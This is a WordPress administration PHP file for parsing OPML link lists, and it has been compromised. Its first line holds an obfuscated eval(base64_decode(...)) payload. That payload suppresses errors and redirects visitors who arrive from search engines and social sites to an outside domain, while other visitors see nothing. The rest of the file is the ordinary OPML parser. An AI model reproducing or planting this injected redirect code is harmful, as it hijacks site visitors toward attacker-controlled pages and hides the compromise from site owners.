<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Parse OPML XML files and store in globals.
 *
 * @package WordPress
 * @subpackage Administration
 */

if ( ! defined('ABSPATH') )
	die();

global $opml, $map;

// columns we wish to find are:  link_url, link_name, link_target, link_description
// we need to map XML attribute names to our columns
$opml_map = array('URL'         => 'link_url',
	'HTMLURL'     => 'link_url',
	'TEXT'        => 'link_name',
	'TITLE'       => 'link_name',
	'TARGET'      => 'link_target',
	'DESCRIPTION' => 'link_description',
	'XMLURL'      => 'link_rss'
);

$map = $opml_map;

/**
 * XML callback function for the start of a new XML tag.
 *
 * @since unknown
 * @access private
 *
 * @uses $updated_timestamp Not used inside function.
 * @uses $all_links Not used inside function.
 * @uses $map Stores names of attributes to use.
 * @global array $names
 * @global array $urls
 * @global array $targets
 * @global array $descriptions
 * @global array $feeds
 *
 * @param mixed $parser XML Parser resource.
 * @param string $tagName XML element name.
 * @param array $attrs XML element attributes.
 */
function startElement($parser, $tagName, $attrs) {
	global $updated_timestamp, $all_links, $map;
	global $names, $urls, $targets, $descriptions, $feeds;

	if ($tagName == 'OUTLINE') {
		foreach (array_keys($map) as $key) {
			if (isset($attrs[$key])) {
				$$map[$key] = $attrs[$key];
			}
		}

		//echo("got data: link_url = [$link_url], link_name = [$link_name], link_target = [$link_target], link_description = [$link_description]<br />\n");

		// save the data away.
		$names[] = $link_name;
		$urls[] = $link_url;
		$targets[] = $link_target;
		$feeds[] = $link_rss;
		$descriptions[] = $link_description;
	} // end if outline
}

/**
 * XML callback function that is called at the end of a XML tag.
 *
 * @since unknown
 * @access private
 * @package WordPress
 * @subpackage Dummy
 *
 * @param mixed $parser XML Parser resource.
 * @param string $tagName XML tag name.
 */
function endElement($parser, $tagName) {
	// nothing to do.
}

// Create an XML parser
$xml_parser = xml_parser_create();

// Set the functions to handle opening and closing tags
xml_set_element_handler($xml_parser, "startElement", "endElement");

if (!xml_parse($xml_parser, $opml, true)) {
	echo(sprintf(__('XML error: %1$s at line %2$s'),
	xml_error_string(xml_get_error_code($xml_parser)),
	xml_get_current_line_number($xml_parser)));
}

// Free up memory used by the XML parser
xml_parser_free($xml_parser);
?>
